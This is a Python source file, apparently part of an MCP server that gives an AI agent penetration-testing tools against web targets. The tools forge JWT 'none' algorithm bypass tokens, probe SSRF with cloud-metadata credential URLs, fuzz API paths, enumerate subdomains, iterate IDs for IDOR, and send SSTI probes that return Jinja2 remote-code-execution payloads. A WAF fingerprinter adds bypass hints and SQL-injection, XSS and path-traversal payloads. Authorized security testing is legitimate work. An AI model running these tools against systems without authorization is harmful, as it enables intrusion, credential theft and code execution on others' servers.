            elif acao and origin.lower() in acao.lower():
                finding["vulnerable"] = True
                finding["issue"] = "Origin reflected in ACAO"
                finding["severity"] = "high" if acac else "medium"
            elif acao == "null":
                finding["vulnerable"] = True
                finding["issue"] = "Null origin accepted"
                finding["severity"] = "high"
            
            if finding["vulnerable"]:
                result["vulnerable"] = True
                result["findings"].append(finding)
            
            result["tests_run"] += 1
    
    log_tool_execution("cors_scanner", {"url": url}, result)
    return json.dumps(result, indent=2)


@mcp.tool()
async def jwt_analyzer(
    token: str,
    check_algorithm: bool = True,
    check_expiry: bool = True,
    test_none_alg: bool = True
) -> str:
    """
    Decode and analyze a JWT token for security issues:
    - Algorithm confusion (none, HS256 vs RS256)
    - Expiration validation
    - Sensitive data in claims
    - Key confusion attacks
    """
    result = {
        "token_preview": token[:50] + "...",
        "valid_format": False,
        "header": {},
        "payload": {},
        "findings": []
    }
    
    parts = token.split('.')
    if len(parts) != 3:
        result["error"] = f"Invalid JWT format: expected 3 parts, got {len(parts)}"
        return json.dumps(result, indent=2)
    
    result["valid_format"] = True
    
    # Decode header and payload
    for i, name in enumerate(["header", "payload"]):
        try:
            padded = parts[i] + '=' * (4 - len(parts[i]) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            result[name] = json.loads(decoded)
        except Exception as e:
            result[name] = {"decode_error": str(e)}
    
    header = result["header"]
    payload = result["payload"]
    
    # Check algorithm
    if check_algorithm:
        alg = header.get("alg", "")
        if alg.lower() == "none":
            result["findings"].append({
                "type": "none_algorithm",
                "severity": "critical",
                "description": "JWT uses 'none' algorithm - signature not verified"
            })
        elif alg == "HS256":
            result["findings"].append({
                "type": "symmetric_algorithm",
                "severity": "medium",
                "description": "HS256 used - if server expects RS256, key confusion attack possible"
            })
    
    # Check expiration
    if check_expiry:
        import time
        exp = payload.get("exp")
        iat = payload.get("iat")
        now = int(time.time())
        
        if exp:
            if exp < now:
                result["findings"].append({
                    "type": "expired_token",
                    "severity": "info",
                    "description": f"Token expired {now - exp} seconds ago"
                })
            else:
                result["findings"].append({
                    "type": "valid_token",
                    "severity": "info",
                    "description": f"Token valid for {exp - now} more seconds"
                })
        else:
            result["findings"].append({
                "type": "no_expiration",
                "severity": "medium",
                "description": "Token has no expiration claim"
            })
    
    # Check for sensitive data
    sensitive_fields = ["password", "secret", "credit_card", "ssn", "token", "api_key"]
    for field in sensitive_fields:
        if field in str(payload).lower():
            result["findings"].append({
                "type": "sensitive_data",
                "severity": "high",
                "description": f"Potentially sensitive field found: {field}"
            })
    
    # Generate none algorithm bypass token
    if test_none_alg:
        none_header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).decode().rstrip('=')
        none_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        result["none_alg_token"] = f"{none_header}.{none_payload}."
    
    log_tool_execution("jwt_analyzer", {"token": token[:30] + "..."}, result)
    return json.dumps(result, indent=2)


@mcp.tool()
async def ssrf_scanner(
    url: str,
    param: str = "url",
    payloads_mode: str = "standard"
) -> str:
    """
    Test for Server-Side Request Forgery (SSRF) vulnerabilities.
    Modes: standard, cloud_metadata, internal_network
    """
    result = {
        "url": url,
        "parameter": param,
        "findings": [],
        "tests_run": 0
    }
    
    payloads = {
        "standard": [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://0.0.0.0",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:3000",
        ],
        "cloud_metadata": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.170.2/v2/credentials",
            "http://100.100.100.200/latest/meta-data/",
        ],
        "internal_network": [
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://192.168.0.1:8080",
            "http://10.0.0.1:9200",  # Elasticsearch
            "http://10.0.0.1:6379",  # Redis
            "http://10.0.0.1:27017",  # MongoDB
        ]
    }
    
    test_payloads = payloads.get(payloads_mode, payloads["standard"])
    
    # Parse URL to inject parameter
    parsed = urllib.parse.urlparse(url)
    
    for payload in test_payloads:
        # Try as query parameter
        if "?" in url:
            test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
        else:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        
        cmd = run_command_advanced(
            ["curl", "-sk", "--max-time", "10",
             "-o", "/dev/null", "-w", "%{http_code}|%{time_total}|%{size_download}",
             test_url],
            timeout=15
        )
        
        if cmd["success"] and cmd["stdout"]:
            parts = cmd["stdout"].split('|')
            if len(parts) >= 3:
                status_code = parts[0]
                response_time = float(parts[1]) if parts[1] else 0
                response_size = int(parts[2]) if parts[2] else 0
                
                finding = {
                    "payload": payload,
                    "status_code": status_code,
                    "response_time": response_time,
                    "response_size": response_size,
                    "suspicious": False
                }
                
                # Check for SSRF indicators
                if status_code == "200" and response_size > 0:
                    finding["suspicious"] = True
                    finding["reason"] = "Got 200 OK with content"
                elif response_time > 3:
                    finding["suspicious"] = True
                    finding["reason"] = "Slow response suggests internal connection"
                
                if finding["suspicious"]:
                    result["findings"].append(finding)
                
                result["tests_run"] += 1
    
    result["vulnerable"] = len(result["findings"]) > 0
    
    log_tool_execution("ssrf_scanner", {"url": url, "param": param}, result)
    return json.dumps(result, indent=2)


@mcp.tool()
async def header_security_audit(
    url: str
) -> str:
    """
    Audit HTTP security headers for a target URL.
    Checks: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, 
    Referrer-Policy, Permissions-Policy, CORS headers.
    """
    result = {
        "url": url,
        "grade": "F",
        "score": 0,
        "headers_present": {},
        "headers_missing": [],
        "findings": []
    }
    
    cmd = run_command_advanced(
        ["curl", "-sI", "-k", "--max-time", "10", url],
        timeout=15
    )
    
    if not cmd["success"]:
        result["error"] = "Could not reach target"
        return json.dumps(result, indent=2)
    
    # Parse headers
    headers = {}
    for line in cmd["stdout"].split('\n'):
        if ':' in line and not line.startswith("HTTP"):
            k, v = line.split(':', 1)
            headers[k.strip().lower()] = v.strip()
    
    # Security header checks
    checks = {
        "strict-transport-security": {
            "name": "HSTS",
            "points": 15,
            "description": "HTTP Strict Transport Security",
            "recommendation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
        },
        "content-security-policy": {
            "name": "CSP",
            "points": 20,
            "description": "Content Security Policy",
            "recommendation": "Add: Content-Security-Policy: default-src 'self'"
        },
        "x-frame-options": {
            "name": "X-Frame-Options",
            "points": 10,
            "description": "Clickjacking Protection",
            "recommendation": "Add: X-Frame-Options: DENY"
        },
        "x-content-type-options": {
            "name": "X-Content-Type-Options",
            "points": 10,
            "description": "MIME Sniffing Protection",
            "recommendation": "Add: X-Content-Type-Options: nosniff"
        },
        "referrer-policy": {
            "name": "Referrer-Policy",
            "points": 10,
            "description": "Referrer Information Control",
            "recommendation": "Add: Referrer-Policy: strict-origin-when-cross-origin"
        },
        "permissions-policy": {
            "name": "Permissions-Policy",
            "points": 10,
            "description": "Browser Feature Control",
            "recommendation": "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()"
        },
        "x-xss-protection": {
            "name": "X-XSS-Protection",
            "points": 5,
            "description": "XSS Filter (legacy)",
            "recommendation": "Add: X-XSS-Protection: 1; mode=block"
        }
    }
    
    for header_key, check in checks.items():
        if header_key in headers:
            result["headers_present"][check["name"]] = headers[header_key]
            result["score"] += check["points"]
        else:
            result["headers_missing"].append(check["name"])
            result["findings"].append({
                "header": check["name"],
                "severity": "high" if check["points"] >= 15 else "medium",
                "description": f"Missing {check['description']}",
                "recommendation": check["recommendation"]
            })
    
    # Check for information disclosure
    info_headers = ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"]
    for h in info_headers:
        if h in headers:
            result["findings"].append({
                "header": h,
                "severity": "low",
                "description": f"Information disclosure: {h}: {headers[h]}",
                "recommendation": f"Remove or obfuscate {h} header"
            })
    
    # Grade
    if result["score"] >= 70:
        result["grade"] = "A"
    elif result["score"] >= 55:
        result["grade"] = "B"
    elif result["score"] >= 40:
        result["grade"] = "C"
    elif result["score"] >= 25:
        result["grade"] = "D"
    else:
        result["grade"] = "F"
    
    log_tool_execution("header_security_audit", {"url": url}, result)
    return json.dumps(result, indent=2)


@mcp.tool()
async def api_endpoint_discovery(
    base_url: str,
    wordlist: str = "common",
    methods: str = "GET,POST",
    auth_header: Optional[str] = None,
    timeout: int = 120
) -> str:
    """
    Discover API endpoints by fuzzing common paths.
    Wordlists: common, rest_api, graphql, fintech, crypto
    """
    result = {
        "base_url": base_url,
        "endpoints_found": [],
        "total_tested": 0,
        "interesting_codes": {}
    }
    
    wordlists = {
        "common": [
            "api", "api/v1", "api/v2", "api/v3", "v1", "v2",
            "health", "status", "version", "info", "docs", "swagger",
            "openapi.json", "swagger.json", "api-docs", "graphql",
            "admin", "dashboard", "config", "settings", "debug",
            "users", "user", "auth", "login", "register", "token",
            "oauth", "callback", "webhook", "websocket", "ws",
            "metrics", "prometheus", "actuator", "env", "trace",
            ".env", "robots.txt", "sitemap.xml", ".git/HEAD",
            "wp-admin", "wp-login.php", "xmlrpc.php", "wp-json",
        ],
        "rest_api": [
            "api/users", "api/user/me", "api/user/profile",
            "api/accounts", "api/account", "api/orders", "api/order",
            "api/products", "api/search", "api/upload", "api/download",
            "api/export", "api/import", "api/report", "api/analytics",
            "api/notifications", "api/messages", "api/payment",
            "api/billing", "api/subscription", "api/invite",
            "api/settings", "api/preferences", "api/admin",
            "api/internal", "api/debug", "api/test", "api/health",
        ],
        "graphql": [
            "graphql", "graphiql", "playground", "api/graphql",
            "v1/graphql", "query", "gql", "graphql/console",
        ],
        "fintech": [
            "api/v1/accounts", "api/v1/balance", "api/v1/transactions",
            "api/v1/transfers", "api/v1/payments", "api/v1/portfolio",
            "api/v1/positions", "api/v1/orders", "api/v1/quotes",
            "api/v1/market", "api/v1/instruments", "api/v1/prices",
            "api/v1/holdings", "api/v1/watchlist", "api/v1/trade",
            "api/v1/user", "api/v1/kyc", "api/v1/2fa",
            "api/v1/withdraw", "api/v1/deposit", "api/v1/history",
            "internal/admin", "internal/debug", "internal/metrics",
        ],
        "crypto": [
            "api/v1/wallet", "api/v1/swap", "api/v1/pool",
            "api/v1/stake", "api/v1/farm", "api/v1/bridge",
            "api/v1/nft", "api/v1/token", "api/v1/price",
            "api/v1/chart", "api/v1/pairs", "api/v1/liquidity",
            "api/v1/governance", "api/v1/proposal", "api/v1/vote",
            "api/v1/airdrop", "api/v1/claim", "api/v1/vesting",
            "api/v1/contract", "api/v1/abi",
        ]
    }
    
    paths = wordlists.get(wordlist, wordlist.split(',') if ',' in wordlist else wordlists["common"])
    method_list = methods.split(',')
    
    base = base_url.rstrip('/')
    
    for path in paths:
        for method in method_list:
            curl_cmd = ["curl", "-sk", "--max-time", "5",
                        "-o", "/dev/null",
                        "-w", "%{http_code}|%{size_download}",
                        "-X", method.strip()]
            
            if auth_header:
                curl_cmd.extend(["-H", f"Authorization: {auth_header}"])
            
            curl_cmd.extend(["-H", "Content-Type: application/json"])
            curl_cmd.append(f"{base}/{path}")
            
            cmd = run_command_advanced(curl_cmd, timeout=10)
            
            if cmd["success"] and cmd["stdout"]:
                parts = cmd["stdout"].split('|')
                code = parts[0] if parts else "0"
                size = parts[1] if len(parts) > 1 else "0"
                
                if code not in ["000", "404", "0"]:
                    endpoint = {
                        "path": f"/{path}",
                        "method": method.strip(),
                        "status_code": code,
                        "response_size": size
                    }
                    result["endpoints_found"].append(endpoint)
                    
                    code_key = f"HTTP_{code}"
                    result["interesting_codes"][code_key] = result["interesting_codes"].get(code_key, 0) + 1
            
            result["total_tested"] += 1
    
    result["total_found"] = len(result["endpoints_found"])
    
    log_tool_execution("api_endpoint_discovery", {"base_url": base_url, "wordlist": wordlist}, result)
    return json.dumps(result, indent=2)


@mcp.tool()
async def subdomain_scanner(
    domain: str,
    use_crtsh: bool = True,
    use_bruteforce: bool = False,
    timeout: int = 120
) -> str:
    """
    Enumerate subdomains using multiple techniques:
    - Certificate Transparency (crt.sh)
    - DNS brute force (optional)
    - subfinder if available
    """
    result = {
        "domain": domain,
        "subdomains": [],
        "total": 0,
        "sources": []
    }
    
    all_subs = set()
    
    # 1. subfinder (if available)
    sf_cmd = run_command_advanced(["subfinder", "-d", domain, "-silent", "-t", "20"], timeout=60)
    if sf_cmd["success"] and sf_cmd["stdout"]:
        subs = [s.strip() for s in sf_cmd["stdout"].split('\n') if s.strip()]
        all_subs.update(subs)
        result["sources"].append({"tool": "subfinder", "found": len(subs)})
    
    # 2. crt.sh (Certificate Transparency)
    if use_crtsh:
        crt_cmd = run_command_advanced(
            ["curl", "-s", "--max-time", "20",
             f"https://crt.sh/?q=%.{domain}&output=json"],
            timeout=25
        )
        if crt_cmd["success"] and crt_cmd["stdout"]:
            try:
                certs = json.loads(crt_cmd["stdout"])
                crt_subs = set()
                for cert in certs:
                    name = cert.get("name_value", "")
                    for s in name.split('\n'):
                        s = s.strip().lstrip('*.')
                        if s.endswith(domain):
                            crt_subs.add(s)
                all_subs.update(crt_subs)
                result["sources"].append({"tool": "crt.sh", "found": len(crt_subs)})
            except json.JSONDecodeError:
                pass
    
    # 3. DNS brute force
    if use_bruteforce:
        import socket
        common_subs = [
            "www", "mail", "ftp", "api", "dev", "staging", "test",
            "admin", "portal", "vpn", "cdn", "static", "img",
            "app", "beta", "demo", "docs", "git", "jenkins",
            "jira", "confluence", "grafana", "kibana", "elastic",
            "mongo", "redis", "db", "sql", "backup", "old",
            "new", "v2", "internal", "intranet", "extranet"
        ]
        bruteforce_found = set()
        for sub in common_subs:
            fqdn = f"{sub}.{domain}"
            try:
                socket.getaddrinfo(fqdn, None)
                bruteforce_found.add(fqdn)
            except socket.gaierror:
                continue
        all_subs.update(bruteforce_found)
        result["sources"].append({"tool": "dns_bruteforce", "found": len(bruteforce_found)})
    
    result["subdomains"] = sorted(list(all_subs))
    result["total"] = len(all_subs)
    
    log_tool_execution("subdomain_scanner", {"domain": domain}, result)
    return json.dumps(result, indent=2)


@mcp.tool()
async def idor_tester(
    url: str,
    param: str = "id",
    start_id: int = 1,
    end_id: int = 20,
    auth_header: Optional[str] = None,
    expected_code: int = 200
) -> str:
    """
    Test for Insecure Direct Object Reference (IDOR) vulnerabilities
    by iterating through sequential IDs and comparing responses.
    """
    result = {
        "url": url,
        "parameter": param,
        "findings": [],
        "tested_range": f"{start_id}-{end_id}",
        "accessible_ids": []
    }
    
    baseline_sizes = {}
    
    for i in range(start_id, end_id + 1):
        test_url = url.replace(f"{{{param}}}", str(i))
        if f"{{{param}}}" not in url:
            if "?" in url:
                test_url = f"{url}&{param}={i}"
            else:
                test_url = f"{url}?{param}={i}"
        
        curl_cmd = ["curl", "-sk", "--max-time", "5",
                     "-o", "/dev/null",
                     "-w", "%{http_code}|%{size_download}|%{time_total}"]
        
        if auth_header:
            curl_cmd.extend(["-H", f"Authorization: {auth_header}"])
        
        curl_cmd.append(test_url)
        
        cmd = run_command_advanced(curl_cmd, timeout=10)
        
        if cmd["success"] and cmd["stdout"]:
            parts = cmd["stdout"].split('|')
            code = int(parts[0]) if parts[0].isdigit() else 0
            size = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
            
            if code == expected_code and size > 0:
                result["accessible_ids"].append({
                    "id": i,
                    "status": code,
                    "size": size,
                    "url": test_url
                })
                baseline_sizes[size] = baseline_sizes.get(size, 0) + 1
    
    # Analyze: if different IDs return different sizes, likely IDOR
    if len(baseline_sizes) > 1 and len(result["accessible_ids"]) > 1:
        result["findings"].append({
            "type": "potential_idor",
            "severity": "high",
            "description": f"Different response sizes for different IDs suggest IDOR. {len(result['accessible_ids'])} accessible objects found.",
            "unique_response_sizes": len(baseline_sizes)
        })
    
    result["vulnerable"] = len(result["findings"]) > 0
    result["total_accessible"] = len(result["accessible_ids"])
    
    log_tool_execution("idor_tester", {"url": url, "param": param}, result)
    return json.dumps(result, indent=2)


@mcp.tool()
async def ssti_scanner(
    url: str,
    param: str = "q",
    method: str = "GET"
) -> str:
    """
    Test for Server-Side Template Injection (SSTI) vulnerabilities.
    Tests Jinja2, Twig, Freemarker, Smarty, Velocity, Pebble templates.
    """
    result = {
        "url": url,
        "parameter": param,
        "vulnerable": False,
        "engine_detected": None,
        "findings": []
    }
    
    # Ordered payloads to detect template engine
    test_payloads = [
        {"payload": "{{7*7}}", "expected": "49", "engine": "Jinja2/Twig"},
        {"payload": "${7*7}", "expected": "49", "engine": "Freemarker/Velocity"},
        {"payload": "<%= 7*7 %>", "expected": "49", "engine": "ERB/JSP"},
        {"payload": "#{7*7}", "expected": "49", "engine": "Ruby/Java EL"},
        {"payload": "*{7*7}", "expected": "49", "engine": "Thymeleaf"},
        {"payload": "{{config}}", "expected": "Config", "engine": "Jinja2"},
        {"payload": "${T(java.lang.Runtime)}", "expected": "Runtime", "engine": "Spring EL"},
    ]
    
    for test in test_payloads:
        encoded_payload = urllib.parse.quote(test["payload"])
        
        if method.upper() == "GET":
            if "?" in url:
                test_url = f"{url}&{param}={encoded_payload}"
            else:
                test_url = f"{url}?{param}={encoded_payload}"
            curl_cmd = ["curl", "-sk", "--max-time", "10", test_url]
        else:
            curl_cmd = ["curl", "-sk", "--max-time", "10",
                        "-X", "POST",
                        "-d", f"{param}={encoded_payload}",
                        url]
        
        cmd = run_command_advanced(curl_cmd, timeout=15)
        
        if cmd["success"] and cmd["stdout"]:
            response = cmd["stdout"]
            if test["expected"] in response and test["payload"] not in response:
                result["vulnerable"] = True
                result["engine_detected"] = test["engine"]
                result["findings"].append({
                    "payload": test["payload"],
                    "expected": test["expected"],
                    "engine": test["engine"],
                    "severity": "critical",
                    "description": f"SSTI confirmed with {test['engine']} engine"
                })
                break
    
    # If vulnerable, try RCE payloads
    if result["vulnerable"] and "Jinja2" in (result["engine_detected"] or ""):
        rce_payloads = [
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{lipsum.__globals__['os'].popen('whoami').read()}}",
        ]
        for rce in rce_payloads:
            result["findings"].append({
                "type": "rce_payload",
                "severity": "critical",
                "payload": rce,
                "description": "Potential RCE payload for Jinja2"
            })
    
    log_tool_execution("ssti_scanner", {"url": url, "param": param}, result)
    return json.dumps(result, indent=2)


@mcp.tool()
async def run_curl_advanced(
    url: str,
    method: str = "GET",
    headers: Optional[str] = None,
    data: Optional[str] = None,
    follow_redirects: bool = True,
    show_headers: bool = True,
    proxy: Optional[str] = None,
    timeout: int = 30
) -> str:
    """
    Advanced HTTP request tool with full control over method, headers, data, and options.
    Headers format: 'Header1: Value1; Header2: Value2'
    """
    cmd = ["curl", "-sk", "--max-time", str(timeout)]
    
    if method.upper() != "GET":
        cmd.extend(["-X", method.upper()])
    
    if follow_redirects:
        cmd.append("-L")
    
    if show_headers:
        cmd.append("-i")
    
    if headers:
        for header in headers.split(';'):
            header = header.strip()
            if header:
                cmd.extend(["-H", header])
    
    if data:
        cmd.extend(["-d", data])
    
    if proxy:
        cmd.extend(["--proxy", proxy])
    
    cmd.append(url)
    
    result_cmd = run_command_advanced(cmd, timeout=timeout + 5)
    
    output = {
        "status": "success" if result_cmd["success"] else "error",
        "url": url,
        "method": method,
        "execution_time": result_cmd["execution_time"],
        "response": result_cmd["stdout"][:5000] if result_cmd["stdout"] else "",
        "errors": result_cmd["stderr"] if result_cmd["stderr"] else None
    }
    
    # Parse response code from response
    if show_headers and result_cmd["stdout"]:
        first_line = result_cmd["stdout"].split('\n')[0]
        if "HTTP" in first_line:
            parts = first_line.split()
            if len(parts) >= 2:
                output["response_code"] = parts[1]
    
    log_tool_execution("run_curl_advanced", {"url": url, "method": method}, output)
    return json.dumps(output, indent=2)


@mcp.tool()
async def waf_fingerprint(
    url: str,
    aggressive: bool = False
) -> str:
    """
    Detect and fingerprint Web Application Firewalls (WAF).
    Tests: Cloudflare, AWS WAF, Akamai, Imperva, Sucuri, ModSecurity, F5 BIG-IP.
    """
    result = {
        "url": url,
        "waf_detected": False,
        "waf_name": "none",
        "confidence": 0,
        "evidence": [],
        "bypass_hints": []
    }
    
    # 1. Check normal headers
    normal_cmd = run_command_advanced(
        ["curl", "-sI", "-k", "--max-time", "10", url],
        timeout=15
    )
    
    headers_text = normal_cmd["stdout"].lower() if normal_cmd["success"] else ""
    
    waf_signatures = {
        "cloudflare": {
            "headers": ["cf-ray", "cf-cache-status", "server: cloudflare"],
            "bypass": ["Use origin IP if found", "Try different HTTP methods", "Encode payloads with Unicode"]
        },
        "aws_waf": {
            "headers": ["x-amzn-", "x-amz-cf-", "server: amazons3"],
            "bypass": ["Unicode normalization", "Header injection", "Case variation"]
        },
        "akamai": {
            "headers": ["x-akamai", "akamai", "akamaighost"],
            "bypass": ["HPP (HTTP Parameter Pollution)", "Chunked encoding"]
        },
        "imperva": {
            "headers": ["x-iinfo", "incap_ses", "visid_incap"],
            "bypass": ["Obfuscate via comments", "Double encoding"]
        },
        "sucuri": {
            "headers": ["x-sucuri", "sucuri", "server: sucuri"],
            "bypass": ["IP rotation", "Payload fragmentation"]
        },
        "modsecurity": {
            "headers": ["server: apache", "mod_security"],
            "bypass": ["Comment injection in SQL", "Concatenation tricks"]
        },
        "f5_bigip": {
            "headers": ["x-wa-info", "bigipserver", "f5-"],
            "bypass": ["HTTP desync", "Newline injection"]
        }
    }
    
    for waf_name, sig in waf_signatures.items():
        for header_sig in sig["headers"]:
            if header_sig in headers_text:
                result["waf_detected"] = True
                result["waf_name"] = waf_name
                result["confidence"] = 90
                result["evidence"].append(f"Header match: {header_sig}")
                result["bypass_hints"] = sig["bypass"]
                break
        if result["waf_detected"]:
            break
    
    # 2. Test with malicious payloads if aggressive
    if aggressive:
        test_payloads = [
            "?id=1' OR '1'='1",
            "?q=<script>alert(1)</script>",
            "?file=../../../../etc/passwd",
        ]
        for payload in test_payloads:
            test_url = url.rstrip('/') + payload
            cmd = run_command_advanced(
                ["curl", "-sk", "--max-time", "10",
                 "-o", "/dev/null", "-w", "%{http_code}",
                 test_url],
                timeout=15
            )
            if cmd["success"]:
                code = cmd["stdout"].strip()
                if code in ["403", "406", "429", "503"]:
                    result["waf_detected"] = True
                    result["evidence"].append(f"Blocked response {code} for payload test")
                    if result["confidence"] < 80:
                        result["confidence"] = 80
    
    log_tool_execution("waf_fingerprint", {"url": url}, result)
    return json.dumps(result, indent=2)


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    import sys
    
    print("Arguments received:", sys.argv)
    logger.info("Initializing Kali MCP Server v3 - Advanced Pentest Edition")
    
    # Run the server
    mcp.run(transport="stdio")
